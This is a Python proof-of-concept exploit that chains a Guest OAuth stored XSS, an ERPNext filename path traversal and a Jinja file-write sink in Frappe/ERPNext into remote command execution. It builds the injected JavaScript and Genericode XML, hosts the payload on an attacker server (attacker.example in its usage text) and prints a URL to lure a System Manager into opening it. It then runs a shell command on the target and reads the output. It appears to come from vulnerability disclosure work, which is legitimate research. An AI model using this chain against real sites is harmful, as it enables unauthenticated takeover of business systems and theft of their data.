#!/usr/bin/env python3
"""Frappe/ERPNext Guest-to-RCE browser chain: FRAPPE-02 + FRAPPE-03 + FRAPPE-04.

An unauthenticated Guest registers an OAuth client whose name stores an XSS
payload (FRAPPE-02). When a System Manager opens the authorize URL, the payload
runs in their session, imports Genericode XML through the ERPNext filename
traversal (FRAPPE-03) to plant a dynamic Jinja page, then uses the safe-Jinja
save() sink (FRAPPE-04) to write a Python controller into an installed app. The
attacker process then requests that route and reads the command output.

This script hosts the payload, registers the client, prints the authorize URL to
send, and waits for the victim. The attacker never needs the victim's password.
Reviewed against Frappe Framework 16.29.0 / ERPNext 16.30.0.

Fix status: FRAPPE-02 is merged to Frappe develop but unreleased on any stable
line; FRAPPE-03 is closed from Frappe 16.34.0 / 15.121.0 and FRAPPE-04 from
16.33.1 / 15.120.1, so the chain needs a site below those versions.
"""

from __future__ import annotations

import argparse
import json
import secrets
import sys

from frappe_chain_common import (
    Client,
    IMPORT_METHOD,
    PocError,
    UPLOAD,
    add_color_argument,
    add_server_arguments,
    authorize_url,
    bad,
    banner,
    build_controller,
    disable_color,
    emit_command_result,
    execute_route,
    fresh_route,
    good,
    info,
    normalize_origin,
    normalize_public_origin,
    register_oauth_client,
    require_fresh_http_route,
    start_payload_server,
    stored_script_tag,
    validate_installed_app_www,
    wait_for_write,
)


def build_genericode(route: str) -> str:
    nonce = secrets.token_hex(8)
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<CodeList>
  <Identification>
    <ShortName>Frappe chain {nonce}</ShortName>
    <Version>1</Version>
    <CanonicalUri>urn:frappe-chain:{nonce}</CanonicalUri>
  </Identification>
  <CanonicalVersionUri>urn:frappe-chain:{route}:{nonce}</CanonicalVersionUri>
  <ControllerWrite>
    {{% if frappe.request.files.get('controller') %}}{{{{ frappe.request.files.get('controller').save(basepath ~ '/{route}.py') }}}}{{% endif %}}
  </ControllerWrite>
  <Result>
    <div id="cmd-status">{{{{ cmd_status }}}}</div>
    <div id="cmd-stdout">{{{{ cmd_stdout }}}}</div>
    <div id="cmd-stderr">{{{{ cmd_stderr }}}}</div>
  </Result>
</CodeList>
'''


def build_javascript(
    payload_base: str,
    route: str,
    remote_path: str,
    genericode: str,
    command: str,
) -> str:
    config = json.dumps(
        {
            "server": payload_base,
            "route": route,
            "remotePath": remote_path,
            "genericode": genericode,
            "controller": build_controller(command).decode(),
            "upload": UPLOAD,
            "importMethod": IMPORT_METHOD,
            "boundary": "----frappe-chain-" + secrets.token_hex(12),
        },
        separators=(",", ":"),
    )
    source = r'''"use strict";
(() => {
  if (globalThis.__frappe020304) return;
  globalThis.__frappe020304 = true;
  const cfg = __CONFIG__;
  const csrfToken = () => (globalThis.frappe && globalThis.frappe.csrf_token) ||
    document.querySelector('input[name="csrf_token"]')?.value;

  async function run() {
    if (document.readyState === "loading") {
      await new Promise(resolve => document.addEventListener("DOMContentLoaded", resolve, {once: true}));
    }
    const csrf = csrfToken();
    if (!csrf) throw new Error("OAuth page exposed no CSRF token");

    const body =
      `--${cfg.boundary}\r\n` +
      `Content-Disposition: form-data; name="method"\r\n\r\n${cfg.importMethod}\r\n` +
      `--${cfg.boundary}\r\n` +
      `Content-Disposition: form-data; name="is_private"\r\n\r\n1\r\n` +
      `--${cfg.boundary}\r\n` +
      `Content-Disposition: form-data; name="file"; filename="${cfg.remotePath}"\r\n` +
      `Content-Type: application/xml\r\n\r\n${cfg.genericode}\r\n` +
      `--${cfg.boundary}--\r\n`;
    const traversal = await fetch(cfg.upload, {
      method: "POST",
      credentials: "same-origin",
      headers: {
        "Content-Type": `multipart/form-data; boundary=${cfg.boundary}`,
        "X-Frappe-CSRF-Token": csrf
      },
      body,
      cache: "no-store"
    });
    const controller = new FormData();
    controller.append(
      "controller",
      new Blob([cfg.controller], {type: "text/x-python"}),
      cfg.route + ".py"
    );
    const written = await fetch("/" + encodeURIComponent(cfg.route) + "?write=1", {
      method: "POST",
      credentials: "same-origin",
      headers: {"X-Frappe-CSRF-Token": csrf},
      body: controller,
      cache: "no-store"
    });
    if (!written.ok) throw new Error("controller write returned HTTP " + written.status);

    await fetch(cfg.server + "/result", {
      method: "POST",
      mode: "no-cors",
      body: "written"
    });
    document.title = "FRAPPE-02 + FRAPPE-03 + FRAPPE-04 complete";
  }

  run().catch(error => {
    console.error("[FRAPPE-02 + FRAPPE-03 + FRAPPE-04]", error);
  });
})();
'''
    return source.replace("__CONFIG__", config)


def make_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="example:\n"
               "  %(prog)s --url https://frappe.example \\\n"
               "    --public-url https://attacker.example \\\n"
               "    --www-path ../../../../apps/custom_app/custom_app/www -c id\n",
    )
    parser.add_argument("--url", required=True, metavar="URL", help="Frappe/ERPNext site origin")
    add_server_arguments(parser)
    parser.add_argument(
        "--www-path",
        required=True,
        metavar="PATH",
        help=(
            "server path from the site's private/files directory, for example "
            "../../../../apps/custom_app/custom_app/www"
        ),
    )
    parser.add_argument(
        "-c", "--command", default="id", metavar="CMD", help="shell command to run (default: id)"
    )
    parser.add_argument("--timeout", type=float, default=30.0, metavar="SECS", help="HTTP timeout (default: 30)")
    parser.add_argument("--insecure", action="store_true", help="disable TLS certificate verification")
    add_color_argument(parser)
    return parser


def run(args: argparse.Namespace) -> int:
    if args.no_color:
        disable_color()
    banner("Guest OAuth XSS + ERPNext traversal + Jinja RCE  ·  FRAPPE-02/03/04")
    if args.timeout <= 0:
        raise PocError("--timeout must be greater than zero")
    target = normalize_origin(args.url, "target URL")
    public_url = normalize_public_origin(args.public_url, target)
    www_path = validate_installed_app_www(args.www_path)

    route = fresh_route("chain020304")
    remote_path = www_path + "/" + route + ".html"
    genericode = build_genericode(route)
    target_client = Client(target, args.timeout, args.insecure)
    require_fresh_http_route(target_client, route)

    info(f"serving payload from {public_url}")
    payload = start_payload_server(
        public_url,
        args.listen_host,
        args.listen_port,
        args.certfile,
        args.keyfile,
    )
    try:
        payload.state.javascript = build_javascript(
            payload.state.payload_base,
            route,
            remote_path,
            genericode,
            args.command,
        )
        client_name = stored_script_tag(payload.state.payload_base + "/payload.js")
        client_id, redirect_uri = register_oauth_client(
            target,
            payload.state.payload_base + "/callback",
            client_name,
            args.timeout,
            args.insecure,
            "frappe02-03-04-chain",
        )
        exploit_url = authorize_url(target, redirect_uri, client_id)
        good(f"registered guest OAuth client {client_id}")
        info("send this authorize URL to a System Manager (no Allow click needed):")
        print(exploit_url, file=sys.stderr, flush=True)
        info(f"waiting up to {args.wait_seconds:g}s for the victim to open it")

        wait_for_write(payload, args.wait_seconds)
        good("browser stage complete; reading command output from the target")

        command_status, stdout, stderr = execute_route(target_client, route)
        emit_command_result(command_status, stdout, stderr)
        return 0
    finally:
        payload.close()


def main() -> int:
    try:
        return run(make_parser().parse_args())
    except PocError as exc:
        bad(str(exc))
        return 1
    except KeyboardInterrupt:
        bad("interrupted")
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
